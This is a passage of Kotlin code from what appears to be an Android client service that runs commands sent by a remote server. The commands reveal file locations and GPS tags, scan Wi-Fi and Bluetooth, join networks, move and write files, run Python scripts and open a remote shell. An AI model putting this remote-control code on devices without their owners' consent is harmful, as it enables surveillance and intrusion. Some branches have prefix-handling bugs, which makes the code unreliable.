                if (coordinates.latitude != null && coordinates.longitude != null) {
                    sendMessage(
                        context,
                        false,
                        "GET_FILE_METADATA: File Size: ${file.length()} bytes, Date Modified: ${file.lastModified()}, Mime Type: $mimeType, Extension: ${MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)}, Path: ${path.replace("//", "/")}, Latitude: ${coordinates.latitude}, Longitude: ${coordinates.longitude}",
                        messageID, serverID
                    )
                } else {
                    sendMessage(
                        context,
                        false,
                        "GET_FILE_METADATA: File Size: ${file.length()} bytes, Date Modified: ${file.lastModified()}, Mime Type: $mimeType, Extension: ${MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)}, Path: ${path.replace("//", "/")}",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "GET_FILE_METADATA: File Size: ${file.length()} bytes, Date Modified: ${file.lastModified()}, Mime Type: $mimeType, Extension: ${MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)}, Path: ${path.replace("//", "/")}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "GET_FILE_METADATA: Operation failed - file does not exist",
                messageID, serverID
            )
        }
    } else if (command.startsWith("VIBRATE_DEVICE ")) {
        try {
            vibrateDevice(
                context,
                command.removePrefix("VIBRATE_DEVICE ").toLong()
            )
            sendMessage(
                context,
                false,
                "VIBRATE_DEVICE: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "VIBRATE_DEVICE: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("SHOW_MESSAGE ")) {
        if (command.removePrefix("SHOW_MESSAGE ") != "") {
            val intent = Intent(context, MessageActivity::class.java)
            intent.putExtra(
                "Message",
                command.removePrefix("SHOW_MESSAGE ")
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        }
        sendMessage(
            context,
            false,
            "SHOW_MESSAGE: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("SCAN_BLUETOOTH_DEVICES ")) {
        var receiver: BroadcastReceiver? = null
        try {
            if (!isBluetoothScanning) {
                isBluetoothScanning = true
                val time =
                    command.removePrefix("SCAN_BLUETOOTH_DEVICES ")
                        .toLong()
                val devices = mutableListOf<Array<String>>()
                val bluetoothManager2 =
                    context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
                val bluetoothAdapter2 = bluetoothManager2.adapter
                if (bluetoothAdapter2.isEnabled) {
                    bluetoothAdapter2.cancelDiscovery()
                    if (ActivityCompat.checkSelfPermission(
                            c,
                            Manifest.permission.BLUETOOTH_CONNECT
                        ) == PackageManager.PERMISSION_GRANTED
                    ) {
                        receiver = object : BroadcastReceiver() {
                            override fun onReceive(
                                context: Context,
                                intent: Intent
                            ) {
                                when (intent.action) {
                                    BluetoothDevice.ACTION_FOUND -> {
                                        val device: BluetoothDevice? =
                                            intent.getParcelableExtra(
                                                BluetoothDevice.EXTRA_DEVICE
                                            )
                                        // Get device information here
                                        if (ActivityCompat.checkSelfPermission(
                                                c,
                                                Manifest.permission.BLUETOOTH_CONNECT
                                            ) == PackageManager.PERMISSION_GRANTED
                                        ) {
                                            val deviceName =
                                                device?.name
                                            val deviceAddress =
                                                device?.address
                                            val deviceClass =
                                                device?.bluetoothClass
                                            val rssi =
                                                intent.getShortExtra(
                                                    BluetoothDevice.EXTRA_RSSI,
                                                    Short.MIN_VALUE
                                                )
                                            devices.add(
                                                arrayOf(
                                                    deviceName.toString(),
                                                    deviceAddress.toString(),
                                                    rssi.toString(),
                                                )
                                            )
                                        } else {
                                            Log.e(
                                                "ClientService",
                                                "BLUETOOTH_CONNECT permission denied in scan"
                                            )
                                            sendMessage(c, false, "SCAN_BLUETOOTH_DEVICES: Operation failed - permission denied between scan", messageID, serverID)
                                        }
                                    }
                                }
                            }
                        }
                        val filter =
                            IntentFilter(BluetoothDevice.ACTION_FOUND)
                        context.registerReceiver(receiver, filter)
                        if (!bluetoothAdapter2.startDiscovery()) {
                            sendMessage(
                                context,
                                false,
                                "SCAN_BLUETOOTH_DEVICES: Operation failed - failed to start discovery",
                                messageID, serverID
                            )
                            isBluetoothScanning = false
                        } else {
                            handler.postDelayed({
                                bluetoothAdapter2.cancelDiscovery()
                                if (ActivityCompat.checkSelfPermission(
                                        c,
                                        Manifest.permission.BLUETOOTH_SCAN
                                    ) == PackageManager.PERMISSION_GRANTED
                                ) {
                                    val json =
                                        Gson().toJson(devices)
                                    sendMessage(
                                        c,
                                        false,
                                        "SCAN_BLUETOOTH_DEVICES: $json",
                                        messageID, serverID
                                    )
                                } else {
                                    sendMessage(
                                        c,
                                        false,
                                        "SCAN_BLUETOOTH_DEVICES: Operation failed - permission denied - ${Gson().toJson(devices)}",
                                        messageID, serverID
                                    )
                                }
                            }, time)
                            context.unregisterReceiver(receiver)
                            isBluetoothScanning = false
                        }
                    } else {
                        sendMessage(
                            context,
                            false,
                            "SCAN_BLUETOOTH_DEVICES: Operation failed - permission denied",
                            messageID, serverID
                        )
                        isBluetoothScanning = false
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "SCAN_BLUETOOTH_DEVICES: Operation failed - bluetooth not enabled",
                        messageID, serverID
                    )
                    isBluetoothScanning = false
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "SCAN_BLUETOOTH_DEVICES: Operation failed - already scanning",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            isBluetoothScanning = false
            if (receiver != null)
                context.unregisterReceiver(receiver)
            sendMessage(
                context,
                false,
                "SCAN_BLUETOOTH_DEVICES: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "SCAN_WIFI") {
        if (!isWifiScanning) {
            isWifiScanning = true
            var wifiScanReceiver: BroadcastReceiver? = null
            try {
                val wifiManager2 =
                    applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                wifiScanReceiver = object : BroadcastReceiver() {
                    override fun onReceive(
                        context: Context,
                        intent: Intent
                    ) {
                        if (intent.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                            val success = intent.getBooleanExtra(
                                WifiManager.EXTRA_RESULTS_UPDATED,
                                false
                            )
                            if (success) {
                                if (ActivityCompat.checkSelfPermission(
                                        c,
                                        Manifest.permission.ACCESS_FINE_LOCATION
                                    ) == PackageManager.PERMISSION_GRANTED
                                ) {
                                    val scanResults =
                                        wifiManager2.scanResults
                                    val results =
                                        mutableListOf<Array<String>>()
                                    for (scanResult in scanResults) {
                                        results.add(
                                            arrayOf(
                                                scanResult.SSID,
                                                scanResult.BSSID,
                                                scanResult.level.toString(),
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) scanResult.wifiStandard.toString() else "",
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) scanResult.apMldMacAddress.toString() else "",
                                                scanResult.frequency.toString(),
                                                scanResult.channelWidth.toString(),
                                                scanResult.centerFreq0.toString(),
                                                scanResult.centerFreq1.toString(),
                                                scanResult.capabilities,
                                                boolToYesNo(
                                                    scanResult.isPasspointNetwork
                                                ),
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) scanResult.apMloLinkId.toString() else "",
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Gson().toJson(
                                                    scanResult.securityTypes
                                                ) else "",
                                                boolToYesNo(
                                                    scanResult.is80211mcResponder
                                                ),
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) scanResult.wifiSsid.toString() else ""
                                            )
                                        )
                                    }
                                    sendMessage(
                                        c,
                                        false,
                                        "SCAN_WIFI: ${Gson().toJson(results)}",
                                        messageID, serverID
                                    )
                                } else {
                                    sendMessage(
                                        c,
                                        false,
                                        "SCAN_WIFI: Operation failed - permission denied",
                                        messageID, serverID
                                    )
                                }
                            } else {
                                sendMessage(
                                    c,
                                    false,
                                    "SCAN_WIFI: Operation failed - scan failed",
                                    messageID, serverID
                                )
                            }
                            context.unregisterReceiver(wifiScanReceiver)
                            isWifiScanning = false
                        }
                    }
                }
                val intentFilter =
                    IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
                context.registerReceiver(wifiScanReceiver, intentFilter)
                if (!wifiManager2.startScan()) {
                    sendMessage(
                        context,
                        false,
                        "SCAN_WIFI: Operation failed - failed to start scan",
                        messageID, serverID
                    )
                    isWifiScanning = false
                    context.unregisterReceiver(wifiScanReceiver)
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
                if (wifiScanReceiver != null)
                    context.unregisterReceiver(wifiScanReceiver)
                isWifiScanning = false
                sendMessage(
                    context,
                    false,
                    "SCAN_WIFI: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        }
    } else if (command.startsWith("CONNECT_TO_WIFI ")) {
        try {
            val data = command.removePrefix("CONNECT_TO_WIFI ")
                .split(" <^/&& **>/^> ")
            if (data.size == 1) {
                val ssid = data[0]
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val specifier = WifiNetworkSpecifier.Builder()
                        .setSsid(ssid)
                        .build()
                    val networkRequest = NetworkRequest.Builder()
                        .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                        .setNetworkSpecifier(specifier)
                        .build()
                    val connectivityManager =
                        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                    val networkCallback =
                        object : ConnectivityManager.NetworkCallback() {
                            override fun onAvailable(network: Network) {
                                // Network connected successfully
                                sendMessage(
                                    c,
                                    false,
                                    "CONNECT_TO_WIFI: Operation completed successfully",
                                    messageID, serverID
                                )
                            }

                            override fun onUnavailable() {
                                // Failed to connect
                                sendMessage(
                                    c,
                                    false,
                                    "CONNECT_TO_WIFI: Operation failed - failed to connect",
                                    messageID, serverID
                                )
                            }
                        }
                    connectivityManager.requestNetwork(
                        networkRequest,
                        networkCallback
                    )
                } else {
                    val wifiManager =
                        applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val wifiConfig = WifiConfiguration().apply {
                        SSID = "\"$ssid\""
                    }
                    val netId = wifiManager.addNetwork(wifiConfig)
                    if (netId != -1) {
                        if (!wifiManager.disconnect()) {
                            if (!wifiManager.enableNetwork(
                                    netId,
                                    true
                                )
                            ) {
                                if (!wifiManager.reconnect()) {
                                    sendMessage(
                                        context,
                                        false,
                                        "CONNECT_TO_WIFI: Operation failed - failed to reconnect",
                                        messageID, serverID
                                    )
                                }
                            } else {
                                sendMessage(
                                    context,
                                    false,
                                    "CONNECT_TO_WIFI: Operation failed - failed to enable network",
                                    messageID, serverID
                                )
                            }
                        } else {
                            sendMessage(
                                context,
                                false,
                                "CONNECT_TO_WIFI: Operation failed - failed to disconnect",
                                messageID, serverID
                            )
                        }
                    } else {
                        sendMessage(
                            context,
                            false,
                            "CONNECT_TO_WIFI: Operation failed - failed to add network",
                            messageID, serverID
                        )
                    }
                }
            } else if (data.size >= 3) {
                val ssid = data[0]
                val password = data[1]
                val t = data[2]
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    if (t.uppercase() == "WPA3") {
                        val specifier = WifiNetworkSpecifier.Builder()
                            .setSsid(ssid)
                            .setWpa3Passphrase(password)
                            .build()
                        val networkRequest = NetworkRequest.Builder()
                            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                            .setNetworkSpecifier(specifier)
                            .build()
                        val connectivityManager =
                            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                        val networkCallback = object :
                            ConnectivityManager.NetworkCallback() {
                            override fun onAvailable(network: Network) {
                                // Network connected successfully
                                sendMessage(
                                    c,
                                    false,
                                    "CONNECT_TO_WIFI: Operation completed successfully",
                                    messageID, serverID
                                )
                            }

                            override fun onUnavailable() {
                                // Failed to connect
                                sendMessage(
                                    c,
                                    false,
                                    "CONNECT_TO_WIFI: Operation failed - failed to connect",
                                    messageID, serverID
                                )
                            }
                        }
                        connectivityManager.requestNetwork(
                            networkRequest,
                            networkCallback
                        )
                    } else if (t.uppercase() == "WPA2") {
                        val specifier = WifiNetworkSpecifier.Builder()
                            .setSsid(ssid)
                            .setWpa2Passphrase(password)
                            .build()
                        val networkRequest = NetworkRequest.Builder()
                            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                            .setNetworkSpecifier(specifier)
                            .build()
                        val connectivityManager =
                            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                        val networkCallback = object :
                            ConnectivityManager.NetworkCallback() {
                            override fun onAvailable(network: Network) {
                                // Network connected successfully
                                sendMessage(
                                    c,
                                    false,
                                    "CONNECT_TO_WIFI: Operation completed successfully",
                                    messageID, serverID
                                )
                            }

                            override fun onUnavailable() {
                                // Failed to connect
                                sendMessage(
                                    c,
                                    false,
                                    "CONNECT_TO_WIFI: Operation failed - failed to connect",
                                    messageID, serverID
                                )
                            }
                        }
                        connectivityManager.requestNetwork(
                            networkRequest,
                            networkCallback
                        )
                    } else {
                        sendMessage(
                            context,
                            false,
                            "CONNECT_TO_WIFI: Operation failed - invalid/unsupported security type",
                            messageID, serverID
                        )
                    }
                } else {
                    val wifiManager =
                        applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val wifiConfig = WifiConfiguration().apply {
                        SSID = "\"$ssid\""
                        preSharedKey = "\"$password\""
                    }
                    val netId = wifiManager.addNetwork(wifiConfig)
                    if (netId != -1) {
                        if (!wifiManager.disconnect()) {
                            if (!wifiManager.enableNetwork(
                                    netId,
                                    true
                                )
                            ) {
                                if (!wifiManager.reconnect()) {
                                    sendMessage(
                                        context,
                                        false,
                                        "CONNECT_TO_WIFI: Operation failed - failed to reconnect",
                                        messageID, serverID
                                    )
                                }
                            } else {
                                sendMessage(
                                    context,
                                    false,
                                    "CONNECT_TO_WIFI: Operation failed - failed to enable network",
                                    messageID, serverID
                                )
                            }
                        } else {
                            sendMessage(
                                context,
                                false,
                                "CONNECT_TO_WIFI: Operation failed - failed to disconnect",
                                messageID, serverID
                            )
                        }
                    } else {
                        sendMessage(
                            context,
                            false,
                            "CONNECT_TO_WIFI: Operation failed - failed to add network",
                            messageID, serverID
                        )
                    }
                }
            } else if (data.size == 2) {
                sendMessage(
                    context,
                    false,
                    "CONNECT_TO_WIFI: Operation failed - no type provided",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "CONNECT_TO_WIFI: Operation failed - no ssid provided",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "CONNECT_TO_WIFI: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("SCAN_BLE_DEVICES ")) {
        val bluetoothManager2 =
            context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        val bluetoothAdapter2 = bluetoothManager2.adapter
        if (bluetoothAdapter2 == null || !bluetoothAdapter2.isEnabled) {
            sendMessage(
                context,
                false,
                "SCAN_BLE_DEVICES: Operation failed - bluetooth not enabled",
                messageID, serverID
            )
        } else {
            if (!isBluetoothLeScanning) {
                var leScanCallback: BluetoothAdapter.LeScanCallback? =
                    null
                val devices = mutableListOf<Array<String>>()
                try {
                    leScanCallback =
                        BluetoothAdapter.LeScanCallback { device, rssi, scanRecord ->
                            // Handle the found device here
                            val uuids = mutableListOf<String>()
                            if (device.getUuids() != null) {
                                for (uuid in device.uuids) {
                                    uuids.add(uuid.uuid.toString())
                                }
                            }
                            devices.add(
                                arrayOf(
                                    if (device.name != null) device.name else "",
                                    device.address,
                                    rssi.toString(),
                                    Base64
                                        .getEncoder()
                                        .encodeToString(scanRecord),
                                    Gson().toJson(uuids),
                                    device.type.toString(),
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && device.alias != null) device.alias.toString() else "",
                                    device.bondState.toString(),
                                )
                            )
                        }
                    if (!bluetoothAdapter2.startLeScan(
                            leScanCallback
                        )
                    ) {
                        sendMessage(
                            context,
                            false,
                            "SCAN_BLE_DEVICES: Operation failed - failed to start scan",
                            messageID, serverID
                        )
                    } else {
                        isBluetoothLeScanning = true
                    }
                    handler.postDelayed(
                        {
                            bluetoothAdapter2.stopLeScan(leScanCallback)
                            sendMessage(
                                context,
                                false,
                                "SCAN_BLE_DEVICES: ${Gson().toJson(devices)}",
                                messageID, serverID
                            )
                            isBluetoothLeScanning = false
                        },
                        command.removePrefix("SCAN_BLE_DEVICES ").toLong()
                    )
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    if (isBluetoothLeScanning) {
                        if (leScanCallback != null) {
                            bluetoothAdapter2.stopLeScan(
                                leScanCallback
                            )
                            sendMessage(
                                context,
                                false,
                                "SCAN_BLE_DEVICES: Operation failed - ${ex.localizedMessage} - ${Gson().toJson(devices)}",
                                messageID, serverID
                            )
                        }
                        isBluetoothLeScanning = false
                    }
                    sendMessage(
                        context,
                        false,
                        "SCAN_BLE_DEVICES: Operation failed - ${ex.localizedMessage}",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "SCAN_BLE_DEVICES: Operation failed - already scanning",
                    messageID, serverID
                )
            }
        }
    } else if (command.startsWith("MOVE ")) {
        var hasPermission = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                hasPermission = true
            }
        } else {
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                hasPermission = true
            }
        }
        if (hasPermission) {
            try {
                val srcPath = "/" + command.removePrefix("MOVE_FILE ")
                    .split(" <?`> ")[0].removePrefix("/")
                val destPath = "/" + command.removePrefix("MOVE_FILE ")
                    .split(" <?`> ")[1].removePrefix("/")
                val srcFile =
                    File(srcPath)
                val destFile =
                    File(destPath)
                if (srcFile.exists()) {
                    if (!destFile.exists()) {
                        if (!srcFile.copyRecursively(destFile)) {
                            sendMessage(
                                context,
                                false,
                                "MOVE: Operation failed - failed to copy $srcPath to $destPath",
                                messageID, serverID
                            )
                        } else {
                            if (srcFile.deleteRecursively()) {
                                sendMessage(
                                    context,
                                    false,
                                    "MOVE: Operation completed successfully",
                                    messageID, serverID
                                )
                            } else {
                                sendMessage(
                                    context,
                                    false,
                                    "MOVE: Operation failed - failed to delete $srcPath",
                                    messageID, serverID
                                )
                            }
                        }
                    } else {
                        sendMessage(
                            context,
                            false,
                            "MOVE: Operation failed - destination file exists",
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "MOVE: Operation failed - source file $srcPath does not exist",
                        messageID, serverID
                    )
                }
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "MOVE: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "MOVE: Operation failed - permission not granted",
                messageID, serverID
            )
        }
    } else if (command.startsWith("RENAME ")) {
        var hasPermission = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                hasPermission = true
            }
        } else {
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                hasPermission = true
            }
        }
        if (hasPermission) {
            try {
                val srcPath = "/" + command.removePrefix("RENAME ")
                    .split(" <?`> ")[0].removePrefix("/")
                val srcFile =
                    File(srcPath)
                var destPath = "/"
                val p = srcFile.parent
                if (p != null) {
                    destPath = p
                }
                destPath += "/" + command.removePrefix("RENAME ")
                    .split(" <?`> ")[1].removePrefix("/")
                val destFile =
                    File(destPath)
                if (srcFile.exists()) {
                    if (!destFile.exists()) {
                        if (!srcFile.renameTo(destFile)) {
                            sendMessage(
                                context,
                                false,
                                "RENAME: Operation failed - failed to rename $srcPath to $destPath",
                                messageID, serverID
                            )
                        } else {
                            sendMessage(
                                context,
                                false,
                                "RENAME: Operation completed successfully",
                                messageID, serverID
                            )
                        }
                    } else {
                        sendMessage(
                            context,
                            false,
                            "RENAME: Operation failed - destination file exists",
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "RENAME: Operation failed - source file $srcPath does not exist",
                        messageID, serverID
                    )
                }
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "RENAME: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "RENAME: Operation failed - permission not granted",
                messageID, serverID
            )
        }
    } else if (command.startsWith("CREATE_FILE_WITH_CONTENT ")) {
        try {
            if (command.removePrefix("CREATE_FILE_WITH_CONTENT ")
                    .split(" <^& %^> ").size < 2
            ) {
                sendMessage(
                    context,
                    false,
                    "CREATE_FILE_WITH_CONTENT: Operation failed - insufficient parameters",
                    messageID, serverID
                )
            } else {
                val filePath = "/" + command.removePrefix("CREATE_FILE_WITH_CONTENT ").split(" <^& %^> ")[0].removePrefix("/")
                val file = File(filePath)
                val content = command.removePrefix("CREATE_FILE_WITH_CONTENT $filePath <^& %^> ")
                file.writeText(content)
                sendMessage(
                    context,
                    false,
                    "CREATE_FILE_WITH_CONTENT: Operation completed successfully",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "CREATE_FILE_WITH_CONTENT: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("RUN_INTERACTIVE_PYTHON_SCRIPT ")) {
        val scriptPath = command.removePrefix("RUN_INTERACTIVE_PYTHON_SCRIPT ").split(" <!|!> ")[0]
        val args = command.removePrefix("x ").split(" <!|!> ")[1].split(" ")
        if (!isMyServiceRunning(context, PythonInteractiveScriptRunnerService::class.java)) {
            // In your Activity or other Context:
            val intent = Intent(context, PythonInteractiveScriptRunnerService::class.java).apply {
                putExtra(PythonInteractiveScriptRunnerService.EXTRA_SCRIPT_PATH, scriptPath)
                putStringArrayListExtra(PythonInteractiveScriptRunnerService.EXTRA_ARGUMENTS, ArrayList(args))
            }
            pythonInteractiveScriptRunnerOutputIndex = 0
            pythonInteractiveScriptRunnerOutputBroadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val output = intent?.getStringExtra(PythonInteractiveScriptRunnerService.EXTRA_OUTPUT)
                    // Process the output here.
                    Log.d("ClientService", "Received output: $output")
                    sendMessage(
                        context,
                        false,
                        "RUN_INTERACTIVE_PYTHON_SCRIPT_OUTPUT: $pythonInteractiveScriptRunnerOutputIndex - $output",
                        messageID, serverID
                    )
                    pythonInteractiveScriptRunnerOutputIndex++
                }
            }
            pythonInteractiveScriptRunnerErrorBroadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val error = intent?.getStringExtra(PythonInteractiveScriptRunnerService.EXTRA_ERROR)
                    // Process the error here.
                    Log.e("ClientService", "Received error: $error")
                    sendMessage(context, false, "RUN_INTERACTIVE_PYTHON_SCRIPT_ERROR: $error", messageID, serverID)
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(
                    pythonInteractiveScriptRunnerOutputBroadcastReceiver,
                    IntentFilter(PythonInteractiveScriptRunnerService.ACTION_OUTPUT),
                    Context.RECEIVER_EXPORTED
                )
                context.registerReceiver(
                    pythonInteractiveScriptRunnerErrorBroadcastReceiver,
                    IntentFilter(PythonInteractiveScriptRunnerService.ACTION_ERROR),
                    Context.RECEIVER_EXPORTED
                )
            } else {
                context.registerReceiver(
                    pythonInteractiveScriptRunnerOutputBroadcastReceiver,
                    IntentFilter(PythonInteractiveScriptRunnerService.ACTION_OUTPUT)
                )
                context.registerReceiver(
                    pythonInteractiveScriptRunnerErrorBroadcastReceiver,
                    IntentFilter(PythonInteractiveScriptRunnerService.ACTION_ERROR)
                )
            }
            context.startService(intent)
            Log.i("ClientService", "PythonRunnerService started")
            sendMessage(
                context,
                false,
                "RUN_INTERACTIVE_PYTHON_SCRIPT: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(context, false, "RUN_INTERACTIVE_PYTHON_SCRIPT: Operation failed - service already running", messageID, serverID)
        }
    } else if (command.startsWith("SEND_INTERACTIVE_PYTHON_SCRIPT_INPUT ")) {
        val input = command.removePrefix("SEND_INTERACTIVE_PYTHON_SCRIPT_INPUT ")
        context.sendBroadcast(Intent(PythonInteractiveScriptRunnerService.ACTION_INPUT).apply {
            putExtra(PythonInteractiveScriptRunnerService.EXTRA_INPUT, input)
        })
    } else if (command == "FORCE_STOP_INTERACTIVE_PYTHON_SCRIPT") {
        context.sendBroadcast(Intent(PythonInteractiveScriptRunnerService.ACTION_SHUTDOWN))
        context.unregisterReceiver(pythonInteractiveScriptRunnerOutputBroadcastReceiver)
        context.unregisterReceiver(pythonInteractiveScriptRunnerErrorBroadcastReceiver)
        sendMessage(
            context,
            false,
            "FORCE_STOP_INTERACTIVE_PYTHON_SCRIPT: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "IS_INTERACTIVE_PYTHON_SCRIPT_RUNNING") {
        sendMessage(
            context,
            false,
            "IS_INTERACTIVE_PYTHON_SCRIPT_RUNNING: ${boolToYesNo(isMyServiceRunning(context, PythonInteractiveScriptRunnerService::class.java))}",
            messageID, serverID
        )
    } else if (command.startsWith("CREATE_VIRTUAL_SHELL ")) {
        val shellPath = command.removePrefix("CREATE_VIRTUAL_SHELL ")
        if (!isMyServiceRunning(context, VirtualShellService::class.java)) {
            // In your Activity or other Context:
            val intent = Intent(context, VirtualShellService::class.java).apply {
                putExtra(VirtualShellService.EXTRA_SHELL_PATH, shellPath)
                putExtra(VirtualShellService.EXTRA_INTERACTIVE_MODE, false)
            }
            virtualShellOutputIndex = 0
            virtualShellOutputBroadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val output = intent?.getStringExtra(VirtualShellService.EXTRA_OUTPUT)
                    // Process the output here.
                    Log.d("ClientService", "Received output: $output")
                    sendMessage(
                        context,
                        false,
                        "VIRTUAL_SHELL_OUTPUT: $virtualShellOutputIndex - $output",
                        messageID, serverID
                    )
                    virtualShellOutputIndex++
                }
            }
            virtualShellErrorBroadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val error = intent?.getStringExtra(VirtualShellService.EXTRA_ERROR)
                    // Process the error here.
                    Log.e("ClientService", "Received error: $error")
                    sendMessage(
                        context,
                        false,
                        "VIRTUAL_SHELL_ERROR: $virtualShellOutputIndex - $error",
                        messageID, serverID
                    )
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(
                    virtualShellOutputBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_OUTPUT),
                    Context.RECEIVER_EXPORTED
                )
                context.registerReceiver(
                    virtualShellErrorBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_ERROR),
                    Context.RECEIVER_EXPORTED
                )
            } else {
                context.registerReceiver(
                    virtualShellOutputBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_OUTPUT)
                )
                context.registerReceiver(
                    virtualShellErrorBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_ERROR)
                )
            }
            context.startService(intent)
            Log.i("ClientService", "VirtualShellService started")
            sendMessage(context, false, "CREATE_VIRTUAL_SHELL: Operation completed successfully", messageID, serverID)
        } else {
            sendMessage(context, false, "CREATE_VIRTUAL_SHELL: Operation failed - virtual shell is already running", messageID, serverID)
        }
    } else if (command.startsWith("CREATE_INTERACTIVE_VIRTUAL_SHELL ")) {
        val shellPath = command.removePrefix("CREATE_INTERACTIVE_VIRTUAL_SHELL ")
        if (!isMyServiceRunning(context, VirtualShellService::class.java)) {
            // In your Activity or other Context:
            val intent = Intent(context, VirtualShellService::class.java).apply {
                putExtra(VirtualShellService.EXTRA_SHELL_PATH, shellPath)
                putExtra(VirtualShellService.EXTRA_INTERACTIVE_MODE, true)
            }
            virtualShellOutputIndex = 0
            virtualShellOutputBroadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val output = intent?.getStringExtra(VirtualShellService.EXTRA_OUTPUT)
                    // Process the output here.
                    Log.d("ClientService", "Received output: $output")
                    sendMessage(
                        context,
                        false,
                        "VIRTUAL_SHELL_OUTPUT: $virtualShellOutputIndex - $output",
                        messageID, serverID
                    )
                    virtualShellOutputIndex++
                }
            }
            virtualShellErrorBroadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val error = intent?.getStringExtra(VirtualShellService.EXTRA_ERROR)
                    // Process the error here.
                    Log.e("ClientService", "Received error: $error")
                    sendMessage(
                        context,
                        false,
                        "VIRTUAL_SHELL_ERROR: $virtualShellOutputIndex - $error",
                        messageID, serverID
                    )
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(
                    virtualShellOutputBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_OUTPUT),
                    Context.RECEIVER_EXPORTED
                )
                context.registerReceiver(
                    virtualShellErrorBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_ERROR),
                    Context.RECEIVER_EXPORTED
                )
            } else {
                context.registerReceiver(
                    virtualShellOutputBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_OUTPUT)
                )
                context.registerReceiver(
                    virtualShellErrorBroadcastReceiver,
                    IntentFilter(VirtualShellService.ACTION_ERROR)
                )
            }
            context.startService(intent)
